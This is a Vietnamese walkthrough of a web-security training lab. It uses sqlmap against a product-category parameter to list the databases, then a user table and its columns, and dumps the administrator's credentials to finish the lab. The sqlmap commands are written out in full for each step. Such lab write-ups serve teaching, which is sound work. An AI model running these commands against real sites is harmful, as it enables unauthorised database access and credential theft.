![image](https://user-images.githubusercontent.com/125866921/232947468-ff1e5b0f-16fe-440f-8ca8-9b5049874261.png)

  - Nhiệm vụ ở lab này là ta phải tìm ra tài khoản ``administrator`` để  đăng nhập vào cửa hàng và hoàn thành lab.  
  - Ta chọn phần ``Gifts`` thì trên URL lúc này sẽ xuất hiện tham số ``Category``.  

![image](https://user-images.githubusercontent.com/125866921/232947947-f583446d-3bde-46e2-99c9-7687ee13fbcc.png)

  - Đầu tiên ta sẽ list ra toàn bộ database của cửa hàng với sqlmap.  
  - Câu lệnh như sau: ``python3 sqlmap.py -u "https://0a4c00ee0409a2ad82d98f4b002600a7.web-security-academy.net/filter?category=Gifts" --dbs``.  
  - Tại đây ta thấy có 7 database xuất hiện. Sau khi thử 1 hồi thì mình chọn database ``PETER`` để kiểm tra xem sao.  

![image](https://user-images.githubusercontent.com/125866921/232948239-217be4be-22e4-451a-97ed-30550c7d03c4.png)

  - Sau khi truy cập vào database ``PETER`` thì xuất hiện 2 bảng ở đây là ``PRODUCTS`` VÀ ``USERS_WXGKSU``.  
  - Câu lệnh như sau: ``python3 sqlmap.py -u "https://0a4c00ee0409a2ad82d98f4b002600a7.web-security-academy.net/filter?category=Gifts" -D PETER --tables``
  - Mình sẽ truy cập vào bảng ``USERS_WXGKSU``.  

![image](https://user-images.githubusercontent.com/125866921/232948429-08c012dc-aef6-4532-88d9-7f1314467155.png)

  - Khi truy cập sẽ xuất hiện 2 cột là ``PASSWORD_GVPMEO`` và ``USERNAME_FVBVAH``.  
  - Câu lệnh như sau: ``python3 sqlmap.py -u "https://0a4c00ee0409a2ad82d98f4b002600a7.web-security-academy.net/filter?category=Gifts" -D PETER -T USERS_WXGKSU --columns``
  - Tài khoản và mật khẩu của tài khoản admin sẽ nằm trong này. Mình sẽ truy cập vào để  lấy nó.  

![image](https://user-images.githubusercontent.com/125866921/232948747-69853d4c-79e1-4721-9ac4-95006d6f142f.png)

  - Sau khi lấy toàn bộ thông tin của 2 cột trên thì tại đây đã xuất hiện tài khoản của admin.  
  - Giờ thì ta chỉ việc đăng nhập vào và hoàn thành lab thui.  

![image](https://user-images.githubusercontent.com/125866921/232948895-a155e2de-553c-4eba-9001-9553b47d9897.png)
